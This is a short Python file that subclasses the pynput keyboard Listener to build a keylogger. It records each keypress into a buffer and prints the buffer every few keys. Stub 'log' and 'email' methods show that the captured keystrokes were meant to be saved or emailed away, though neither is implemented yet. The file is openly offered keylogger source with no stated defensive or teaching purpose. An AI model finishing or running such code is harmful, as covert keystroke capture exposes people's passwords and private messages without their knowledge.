from pynput.keyboard import Listener, Key
import os


class CustomListener(Listener):
    counter = 0
    count_limit = 0
    cache = ""

    def __init__(self, count_limit=5, method="log",
                 path=os.getcwd(), *args, **kwargs):
        self.method = method
        self.count_limit = count_limit
        self.path = path

        self.methods = {
            "log": lambda x: x,
            "email": lambda x: x
        }

        super().__init__(on_press=self.on_press, *args, **kwargs)

    def count(self):
        self.counter += 1
        if self.counter == self.count_limit:
            self.counter = 0
            return True
        return False

    def on_press(self, key: Key):
        try:
            self.cache += key.char
        except AttributeError:
            if str(key) == "Key.space":
                self.cache += " "

        if self.count():
            print(self.cache)
            self.cache = ""
            self.methods[self.method](1)
